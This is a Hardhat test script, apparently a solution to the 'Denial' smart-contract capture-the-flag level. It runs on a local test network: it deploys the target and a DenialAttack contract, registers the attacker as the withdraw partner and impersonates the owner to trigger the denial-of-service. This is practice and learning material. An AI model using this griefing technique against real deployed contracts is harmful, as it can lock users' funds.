const {expect} = require('chai');
const {ethers, waffle, network} = require('hardhat');
// import {JsonRpcSigner} from '@ethersproject/providers';

describe('Denial', function () {
	it('should break', async function () {
		let downer;

		const [owner, knower] = await ethers.getSigners();
		console.log('owner.address', owner.address);

		await network.provider.request({
			method: 'hardhat_impersonateAccount',
			params: ['0x0000000000000000000000000000000000000A9e'],
		});

		downer = await ethers.provider.getSigner(
			'0x0000000000000000000000000000000000000A9e'
		);

		const Denial = await ethers.getContractFactory('Denial');
		const denial = await Denial.deploy();
		await denial.deployed();

		await knower.sendTransaction({
			to: denial.address,
			value: ethers.utils.parseEther('0.001'),
		});

		await knower.sendTransaction({
			to: '0x0000000000000000000000000000000000000A9e',
			value: ethers.utils.parseEther('10'),
		});

		const DenialAttack = await ethers.getContractFactory('DenialAttack');
		const denialAttack = await DenialAttack.deploy();
		await denialAttack.deployed();

		// let ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBal', ethBal);

		// await (await denial.setFirstTime(prBreak.address)).wait();

		await (await denial.setWithdrawPartner(denialAttack.address)).wait();

		await (await denial.connect(downer).withdraw()).wait();

		console.log('partner', await denial.partner());
		// console.log('letSee2', await denial.letSee2());
		// console.log('owner', await denial.owner());
		// console.log('storedTime', await denial.storedTime());

		// await (await dr.attack('1000000000000000')).wait();

		// ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBalAfter', ethBal);
		// let y;
		// for (let x = 0; x < 4294967296; x++) {
		// 	if ((x % 256 == x % 65536) == 8806) {
		// 		console.log('X:', x);
		// 	}
		// }
	});
});
